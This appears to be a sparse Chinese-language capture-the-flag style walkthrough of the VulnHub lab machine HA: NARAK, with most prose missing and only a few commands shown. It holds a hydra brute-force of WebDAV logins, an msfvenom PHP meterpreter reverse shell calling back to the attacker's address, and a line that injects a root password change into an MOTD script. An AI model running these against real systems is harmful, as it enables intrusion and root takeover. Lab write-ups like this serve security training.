# 原创
：  VulnHub渗透测试实战靶场-HA：NARAK

# VulnHub渗透测试实战靶场-HA：NARAK

#### VulnHub渗透测试实战靶场-HA：NARAK

## 环境下载

> 



## HA：NARAK靶机搭建

> 



## 渗透测试

### 信息搜集

> 



> 



> 



### 漏洞挖掘

> 



```
cewl http://192.168.246.140 -w wordlist.txt

hydra -L wordlist.txt -P wordlist.txt -f -V 192.168.246.140 http-get /webdav

```

### getshell

> 



```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.246.129 LPORT=1234 R &gt; shell.php

```

### 提权

> 



> 



> 



> 



> 



```
echo "echo 'root:d1no' | sudo chpasswd" &gt;&gt; 00-header

```

> 


